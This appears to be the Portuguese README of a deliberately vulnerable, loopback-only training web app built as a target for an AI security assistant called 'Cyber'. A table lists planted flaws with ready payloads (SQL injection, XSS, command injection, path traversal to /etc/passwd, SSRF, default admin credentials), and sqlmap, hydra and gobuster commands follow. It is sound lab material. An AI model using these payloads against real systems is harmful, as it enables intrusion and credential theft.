# 🎯 VulnLab — alvo de treino local

Aplicação **deliberadamente vulnerável** pra dar ao Cyber (e às ferramentas
`nmap`/`sqlmap`/`gobuster`/`nikto`/`hydra`) um alvo **real e autorizado**,
fechando o ciclo achar→explorar→reportar sem tocar em sistemas de terceiros.

> ⚠️ **Só loopback.** Sobe apenas em `127.0.0.1` (o app recusa qualquer outro
> host). Nunca exponha à rede. É inseguro de propósito.

## Subir

```bash
./lab/run_lab.sh          # porta 8666
./lab/run_lab.sh 9000     # outra porta
```

Só usa a biblioteca padrão do Python — não instala nada.

## Vulnerabilidades plantadas

| Onde | Classe | Como explorar |
|------|--------|---------------|
| `GET /login?user=&pass=` | SQL injection | `user=' OR '1'='1` · `pass=' OR '1'='1` |
| `GET /search?q=` | XSS refletido | `q=<script>alert(1)</script>` |
| `GET /ping?host=` | Command injection | `host=127.0.0.1; id` roda no servidor |
| `GET /download?file=` | Path traversal | `file=../../../../etc/passwd` |
| `GET /profile?id=` | IDOR | `id=1`, `id=2`… lê perfil de qualquer um, sem auth |
| `GET /fetch?url=` | SSRF | `url=http://127.0.0.1:8667/status` (alcança interno) |
| `GET /admin` | Auth fraca (Basic) | bruteforce → `admin:admin123` |
| `/robots.txt` `/backup.zip` `/.git/HEAD` `/config.php` | Exposição / enum | gobuster com `lab/wordlist.txt` |
| header `Server: VulnLab/1.0` | Banner de versão | searchsploit / nikto |
| 2º alvo `AdminPanel/2.3` na porta 8667 | Múltiplos serviços | `nmap -sV 127.0.0.1 -p 8666,8667` |

## Exemplos com as ferramentas

```bash
# enum de diretórios
gobuster dir -u http://127.0.0.1:8666 -w lab/wordlist.txt

# SQL injection
sqlmap -u "http://127.0.0.1:8666/login?user=admin&pass=x" --batch

# bruteforce do /admin (Basic auth)
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  127.0.0.1 -s 8666 http-get /admin

# scan web
nikto -h http://127.0.0.1:8666
```

Pelo chat do Cyber: adicione `127.0.0.1` ao escopo autorizado (aba
**⚙️ Configurações**) e peça, por ex.: *"faz um nmap no 127.0.0.1 porta 8666
e depois enumera diretórios"*.
